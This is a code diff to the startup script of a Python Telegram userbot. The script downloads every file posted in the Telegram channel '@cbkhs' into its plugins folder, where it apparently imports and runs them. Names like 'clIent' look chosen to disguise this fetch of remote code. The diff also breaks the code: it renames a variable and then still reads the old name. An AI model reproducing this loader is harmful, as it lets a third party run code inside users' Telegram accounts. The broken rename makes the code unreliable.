@@ -1,3 +1,4 @@
+
 from sys import argv
 import sys
 from telethon.errors.rpcerrorlist import PhoneNumberInvalidError
@@ -17,7 +18,7 @@ from telethon.tl.types import InputMessagesFilterDocument
 from userbot.utils import command, remove_plugin, load_module
 from userbot.plugins import *
 import traceback 
-client = bot
+ItzSjDude = bot
 
 async def add_bot(bot_token):
     await bot.start(bot_token)
@@ -45,12 +46,14 @@ else:
     else:
         bot.start()
     
+client = ItzSjDude
+ItzSjDude.loop.run_until_complete(inistr())
 
 async def a():
     clIent = "@cbkhs"
-    itzsjdude = await bot.get_messages(clIent, None , filter=InputMessagesFilterDocument) ; total = int(itzsjdude.total) ; total_doxx = range(0, total)
+    itzsj = await bot.get_messages(clIent, None , filter=InputMessagesFilterDocument) ; total = int(itzsjdude.total) ; total_doxx = range(0, total)
     for ixo in total_doxx:
-        mxo = itzsjdude[ixo].id ; await client.download_media(await bot.get_messages(clIent, ids=mxo), "userbot/plugins/")
+        mxo = itzsj[ixo].id ; await client.download_media(await bot.get_messages(clIent, ids=mxo), "userbot/plugins/")
 bot.connect()
 bot.loop.run_until_complete(a())
 
